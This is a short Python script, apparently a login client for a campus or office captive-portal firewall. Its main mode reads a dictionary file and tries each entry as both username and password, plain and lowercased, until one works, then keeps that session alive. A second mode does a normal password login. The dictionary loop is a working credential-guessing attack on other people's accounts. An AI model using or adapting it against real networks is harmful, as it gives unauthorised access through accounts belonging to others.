import authclass as auth
import sys
import requests
import os

def looper(dict_file):
    if auth.checkConnection() is 1:
        print("Internet access present\nNo Authentication required!")
        exit()

    try:
        with open(dict_file) as fin:
            for line in fin:
                dictionary = fin.read().splitlines()
    except:
        print("Dictionary file "+ dict_file + " not found")
        return

    for roll in dictionary:
        authObj = auth.firewallAuth()
        os.system('clear')
        try:
            print('\rTrying :' + roll)
            if authObj.authenticate(roll,roll) is 1:
                authObj.keepalive()
                exit()
            if authObj.authenticate(roll.lower(),roll.lower()) is 1:
                authObj.keepalive()
                exit()
        except requests.exceptions.RequestException as e:
            print(e)
            exit()

if __name__ == "__main__":
    from argparse import ArgumentParser
    import getpass
    parser = ArgumentParser()
    parser.add_argument("-u", "--username",
                    help="Specify Username")
    parser.add_argument("-d", "--dict-file", default="dict.txt", dest="dict",
                    help="Specify dictionary file (default dict.txt)")
    args = parser.parse_args()
    if args.username is None:
        looper(args.dict)
    else:
        if auth.checkConnection() is 1:
            print("Internet access present\nNo Authentication required!")
            exit()
        password = getpass.getpass('Enter Password: ')
        authObj = auth.firewallAuth()
        ret = authObj.authenticate(args.username,password)
        if ret == 1:
            authObj.keepalive()
        elif ret == 2:
            print("Sorry, user's concurrent authentication is over limit!")
        else:
            print("Connection error!")
